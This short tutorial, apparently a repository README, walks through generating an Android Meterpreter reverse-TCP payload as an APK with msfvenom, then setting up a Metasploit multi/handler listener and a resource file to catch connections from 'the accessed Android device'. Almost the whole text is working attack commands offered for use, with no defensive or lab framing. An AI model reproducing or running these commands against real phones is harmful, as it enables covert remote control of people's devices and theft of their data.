### androidcode

# Android payload Generating Metasploit.....!

```
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.apk && clear
```

# payload listener ( For listening to the accessed Android device)

```
sudo msfconsole
```
```
use exploit/multi/handler

```
```
set payload android/meterpreter/reverse_tcp
```
```
set lhost $lhost

```
```
set lport 8080
```
```
exploit
```

#### you guys can speed up your hack by make a android.rc file 

=====================> just follow my lead 

#### just edit the file named android.rc file 

### Edit the  lhost & lport 

### Run the listenerusing the android.rc file 
```
msfconsole -r android.rc
```
wait for the accessed Android device to come in line......>>>! 
